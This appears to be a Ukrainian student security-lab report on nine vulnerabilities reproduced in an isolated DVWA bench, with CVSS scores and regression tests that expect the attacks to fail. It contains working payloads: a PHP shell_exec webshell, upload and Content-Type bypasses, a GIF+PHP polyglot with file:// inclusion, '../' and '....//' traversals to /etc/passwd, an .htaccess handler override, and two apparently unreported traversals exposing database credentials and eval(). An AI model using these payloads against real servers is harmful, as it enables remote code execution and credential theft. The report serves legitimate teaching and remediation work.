# Підтверджені вразливості (етап 3)

Кожну вразливість відтворено на власному ізольованому стенді. Відтворення автоматизовано в `exploits/poc.py`,
сирі запити й відповіді збережено в `evidence/stage3/V*.txt`, зведення — у `evidence/stage3/summary_before.txt`.
Корисне навантаження синтетичне: `<?php echo "RGR-V8-" . (7*191) . " id: " . shell_exec("id"); ?>`.
Маркер `RGR-V8-1337` з'являється лише тоді, коли код справді виконано на сервері, бо в самому файлі числа 1337 немає.

| V | Рівень | Вразливість | CWE | CVSS 3.1 | Бали | Загроза | SAST |
|---|---|---|---|---|---|---|---|
| V1 | low | Необмежене завантаження `.php` → RCE | CWE-434 | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H | 9.9 | T1 | S1 |
| V2 | medium | Підробка `Content-Type` обходить перевірку → RCE | CWE-434, CWE-345 | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H | 9.9 | T2 | S2, S3 |
| V3 | high | Поліглот GIF+PHP з розширенням `.jpg` + LFI через `file://` → RCE | CWE-434, CWE-98 | AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H | 8.5 | T5 | S4, S14 |
| V4 | low | Обхід каталогів `../` у `?page=` → читання `/etc/passwd` | CWE-22, CWE-98 | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N | 7.7 | T4 | S10, S15 |
| V5 | medium | Обхід фільтра `str_replace("../")` через `....//` | CWE-22, CWE-184 | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N | 7.7 | T4 | S11, S12 |
| V6 | high | Обхід `fnmatch("file*")` через `file:///etc/passwd` | CWE-22 | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N | 7.7 | T6 | S13, S14, S16 |
| V7 | medium | Завантаження `.htaccess` змінює обробник (`AllowOverride All`) → RCE | CWE-434, CWE-1188 | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H | 9.9 | T3 | S2 |
| V8 | **усі**, у т. ч. impossible | Обхід каталогів у `view_source.php` → вихідний код `config.inc.php` з паролем БД | CWE-22, CWE-200 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 6.5 | T6 | S17–S19 |
| V9 | **усі**, у т. ч. impossible | Обхід каталогів у `view_help.php` → `eval()` довільного `.php` на диску | CWE-22, CWE-95 | AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L | 6.3 | T5 | S21 |

CVE: вразливості V1–V7 навмисні й не мають CVE. V8 і V9 знайдено в службових сторінках актуальної версії DVWA (коміт `502ac15`), відомих CVE для них немає.
Про них слід повідомити викладача, а не оприлюднювати (п. 1.2 практикуму). Ступінь вразливості всіх рівнів підвищує загроза T12: рівень безпеки задає клієнтська cookie `security`.

## Сценарії відтворення

**V1.** Увійти як `admin`, `security=low`. Надіслати POST `/vulnerabilities/upload/` з полем `uploaded=rgr_v1_<rnd>.php`
(`Content-Type: application/x-php`). Відповідь повідомляє шлях `../../hackable/uploads/rgr_v1_<rnd>.php`. GET цього файлу
повертає `RGR-V8-1337 id: uid=33(www-data) gid=33(www-data)`. Причина: ім'я й розширення файлу задає клієнт, перевірок немає,
каталог лежить у web root, а Apache виконує `*.php`.

**V2.** Те саме на `security=medium`, але з `Content-Type: image/jpeg`. Перевірка `$_FILES['uploaded']['type']` довіряє заголовку
від клієнта, а розширення не перевіряє.

**V3.** `security=high`: файл `rgr_v3_<rnd>.jpg` = коректний GIF 1×1 + PHP-код. Він проходить перевірку розширення й `getimagesize()`.
Потім GET `/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/rgr_v3_<rnd>.jpg`, і `include()` виконує PHP-частину.
Отже, перевірок на рівні high недостатньо, коли в системі є LFI.

**V4.** `security=low`: `?page=../../../../../../etc/passwd` повертає вміст `/etc/passwd`.

**V5.** `security=medium`: фільтр видаляє `../` один раз, тож `....//` після заміни перетворюється на `../`. Payload:
`?page=....//....//....//....//....//....//etc/passwd`. Абсолютний шлях `/etc/passwd` також не фільтрується.

**V6.** `security=high`: умова `fnmatch("file*", $file)` виконується для `file:///etc/passwd`.

**V7.** `security=medium`: завантажити `.htaccess` (`Content-Type: image/png`) з директивою
`<FilesMatch "\.rgrXXXX$"> SetHandler application/x-httpd-php </FilesMatch>`, потім `rgr_v7.rgrXXXX` з PHP-кодом.
GET файлу виконує код. Причина: `AllowOverride All` у `docker-php.conf` базового образу разом із тим, що ім'я задає клієнт.
На рівні high `.htaccess` відхиляється (перевірено).

**V8.** На будь-якому рівні: GET `/vulnerabilities/view_source.php?id=fi&security=../../../config/config.inc`.
PHP нормалізує шлях `../vulnerabilities/fi/source/../../../config/config.inc.php` лексично й підсвічує вихідний код
конфігурації: `db_user`, `db_password`. Параметри `id` і `security` ніде не перевіряються.

**V9.** На будь-якому рівні: GET `/vulnerabilities/view_help.php?id=fi&security=low&locale=x/../../../../phpinfo`.
Рядок `help.x/../../../../phpinfo.php` нормалізується до `phpinfo.php` і передається в `eval('?>' . file_get_contents(...))`.
У результаті виконується будь-який `.php`-файл на диску. Разом із V1 це ще один шлях до RCE.

## Регресійні тести

`tests/regression/test_vulns_fixed.py` запускає кожен сценарій і вимагає, щоб атака **не** вдалася.
Стан до виправлень: 9 failed (`evidence/stage3/pytest_before.txt`).
